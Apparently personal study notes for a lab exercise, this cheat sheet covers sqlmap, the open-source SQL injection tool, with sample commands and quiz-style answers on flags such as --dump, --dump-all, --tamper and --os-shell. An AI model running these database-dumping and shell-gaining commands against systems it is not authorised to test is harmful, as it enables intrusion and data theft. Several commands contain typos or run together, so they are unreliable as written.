# sqlmap
*sqlmap* is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. It comes with a powerful detection engine, many niche features for the ultimate penetration tester and a broad range of switches lasting from database fingerprinting, over data fetching from the database, to accessing the underlying file system and executing commands on the operating system via out-of-band connections. [More](https://github.com/sqlmapproject/sqlmap)
```
sqlmap -r request.txt --dbms=mysql --dump sqlmap -r request.txt -p username

sqlmap -u http://domain.name --form

sqlmap --dbms=SQLite -r Burp --tamper=cspace2comment --level=3 -- dump-all
```
```
-r uses the intercepted request you saved earlier What flag sets which database is in the target host's backend?  
Ex: If the flag is set to mysql then sqlmap will only test mysql injections).

--dbms tells SQLMap what type of database management system it is How do you dump the table entries of the database?
--dump attempts to outputs the entire database
How do you select(lol) which parameter to use?(Example: in the url http://ex.com?test=1 the parameter would be test.)
-p use the pramater
how do you select the level of depth sqlmap should use(higher = more accurate and more tests in general).
--level
How do you ask sqlmap to try to get an interactive os-shell?
--os-shell
What flag dumps all data from every table
--dump-all
#location of dump csv /home/pthsovann/.local/share/sqlmap/output/10.10.64.78/‐ dump/
```
